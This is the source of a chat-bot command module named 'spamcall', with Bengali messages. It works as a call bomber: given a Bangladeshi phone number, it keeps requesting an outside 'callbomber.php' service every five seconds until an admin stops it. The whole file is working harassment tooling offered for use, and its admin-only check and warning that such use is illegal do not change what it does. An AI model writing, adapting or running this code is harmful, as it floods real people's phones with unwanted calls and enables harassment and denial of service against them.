module.exports.config = {
  name: "spamcall",
  version: "1.0.0",
  hasPermssion: 2,
  credits: "—͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️", //don't change credit
  description: "অনবরত কল বোম্বার, বন্ধ করতে /spamcall off (শুধুমাত্র বট অ্যাডমিনদের জন্য)",
  commandCategory: "Tool",
  usages: "/spamcall 01xxxxxxxxx অথবা /spamcall off (শুধুমাত্র বট অ্যাডমিনদের জন্য)",
  cooldowns: 0,
  dependencies: { "axios": "" }
};
 
const axios = require("axios");
const callFlags = {};
 
module.exports.run = async ({ api, event, args, permssion }) => {
  const threadID = event.threadID;
  const senderID = event.senderID;
  const number = args[0];
  
  // Check if user is a bot admin
  if (permssion < 2) {
    return api.sendMessage("❌ Only bot administrators can use this command.", threadID);
  }
 
  if (number === "off") {
    if (callFlags[threadID]) {
      callFlags[threadID] = false;
      return api.sendMessage("✅ কল বোম্বার বন্ধ করা হয়েছে।", threadID);
    } else {
      return api.sendMessage("❗এই থ্রেডে কোন কল বোম্বিং চলছিল না।", threadID);
    }
  }
 
  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("•┄┅════❁🌺❁════┅┄•\n\n☠️••CALL BOMBER BY —͟͟͞͞𝐂𝐘𝐁𝐄𝐑 ☢️_𖣘 -𝐁𝐎𝐓 ⚠️ 𝑻𝑬𝑨𝑴_ ☢️💣\n\nব্যবহার:\n/spamcall 01xxxxxxxxx\n\n(বাংলাদেশি নাম্বার দিন, শুধু মজার জন্য ব্যবহার করুন)\n\n⚠️ শুধুমাত্র বট অ্যাডমিনদের জন্য\n\n•┄┅════❁🌺❁════┅┄•", threadID);
  }
 
  if (callFlags[threadID]) {
    return api.sendMessage("❗এই থ্রেডে ইতিমধ্যে কল বোম্বিং চলছে! বন্ধ করতে /spamcall off", threadID);
  }
 
  api.sendMessage(`✅ কল বোম্বিং শুরু হয়েছে ${number} নম্বরে...📞💣\nবন্ধ করতে /spamcall off\n\nকাউকে বিরক্ত করার জন্য এই টুল ব্যবহার সম্পূর্ণ নিষিদ্ধ এবং আইনত অপরাধ।`, threadID);
 
  callFlags[threadID] = true;
 
  (async function startCallBombing() {
    while (callFlags[threadID]) {
      try {
        await axios.get(`https://tbblab.shop/callbomber.php?mobile=${number}`);
        // Add a small delay between calls to prevent overwhelming the API
        await new Promise(resolve => setTimeout(resolve, 5000));
      } catch (err) {
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        callFlags[threadID] = false;
        break;
      }
    }
  })();
};